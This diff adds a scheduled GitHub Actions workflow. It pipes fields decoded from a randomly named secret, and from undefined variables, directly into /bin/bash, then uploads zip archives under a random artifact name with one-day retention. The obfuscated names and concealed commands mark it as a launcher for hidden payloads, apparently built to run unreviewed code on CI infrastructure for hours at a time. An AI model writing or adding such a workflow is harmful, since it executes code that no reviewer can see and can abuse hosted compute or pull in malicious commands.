@@ -1,0 +1,39 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '25 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          wfqx0: ${{ secrets.wfqx0 }}
+        run: |
+          printf '%s' "$wfqx0" | jq -r .xjuaa598 | /bin/bash
+          echo $ay2 | jq -r .cdpci24110 | /bin/bash
+          echo $iex07963 | jq -r .xxt8 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: HfBIUiUG
+          path: "*.zip"
+          retention-days: 1
